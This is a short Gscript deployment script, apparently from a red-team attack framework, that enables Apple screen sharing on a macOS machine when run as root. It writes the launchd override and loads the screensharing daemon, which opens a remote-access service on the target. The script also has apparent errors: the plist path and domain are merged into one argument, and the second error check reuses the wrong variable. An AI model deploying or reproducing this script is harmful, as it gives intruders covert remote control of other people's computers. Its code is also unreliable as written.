
// enable screen sharing
// Title: enable apple RDP
// Author: 
// Purpose: 
// Gscript version: 1.0.0
// Tactic: 
// ATT&CK: 

//priority:130
//timeout:130

//go_import:os/user as user
  
function Deploy() {  
    console.log("Enabling apple RDP service");

    //Ensure running as root
    var curUser = user.Current();
    console.log("Our user is: "+curUser[0].Username);
    if (curUser[0].Username == "root") {
        var execResp = G.exec.ExecuteCommand("defaults", ["write", "/var/db/launchd.db/com.apple.launchd/overrides.plist com.apple.screensharing", "Disabled", "-bool", "false"]);
        console.log("Pid: "+execResp[0]);
        console.log("stdout: "+execResp[1]);
        console.log("stderr: "+execResp[2]);
        console.log("exit code: "+execResp[3]);
        if (execResp[4] != null) {
            console.log("go errors: "+execResp[4].Errors());  
        }        
        var execResp2 = G.exec.ExecuteCommand("launchctl", ["load", "-w", "/System/Library/LaunchDaemons/com.apple.screensharing.plist"]);
        console.log("Pid: "+execResp2[0]);
        console.log("stdout: "+execResp2[1]);
        console.log("stderr: "+execResp2[2]);
        console.log("exit code: "+execResp2[3]);
        if (execResp[4] != null) {
            console.log("go errors: "+execResp[4].Errors());  
        }    
    } else {
        console.log("Not running as root!");
    }

    console.log("Enabling apple RDP service");
    return true;
  }



